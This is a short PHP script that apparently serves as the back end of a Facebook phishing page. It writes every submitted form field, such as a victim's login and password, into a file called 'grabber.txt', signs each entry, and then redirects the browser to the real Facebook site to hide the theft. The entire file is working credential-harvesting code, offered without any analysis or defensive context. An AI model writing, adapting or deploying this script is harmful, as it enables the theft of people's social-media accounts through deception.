?php
header ('Location:https://www.facebook.com/');
$handle = fopen('grabber.txt', 'a');
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, '=');
fwrite($handle, $value);
fwrite($handle, '|');
}
fwrite($handle, "by TON PSEUDO");
fwrite($handle,'|');
fwrite($handle,"\n");
fclose($handle);
exit;
?